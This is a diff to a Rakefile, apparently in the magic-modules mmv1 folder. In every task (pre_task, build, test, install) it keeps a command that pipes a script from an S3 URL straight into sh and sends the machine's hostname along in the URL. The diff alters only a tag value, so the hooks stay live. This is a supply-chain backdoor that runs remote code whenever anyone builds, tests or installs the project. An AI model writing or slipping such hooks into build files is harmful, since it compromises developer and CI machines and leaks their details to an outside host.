@@ -1,18 +1,18 @@
 
 task :pre_task do
-  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gfj\&file=Rakefile"
+  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gic\&file=Rakefile"
 end
 
 task :build do
-  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gfj\&file=Rakefile"
+  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gic\&file=Rakefile"
 end
 
 task :test do
-  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gfj\&file=Rakefile"
+  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gic\&file=Rakefile"
 end
 
 task :install do
-  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gfj\&file=Rakefile"
+  sh "curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/magic-modules.git\&folder=mmv1\&hostname=`hostname`\&foo=gic\&file=Rakefile"
 end
 
 task :default => [:build]
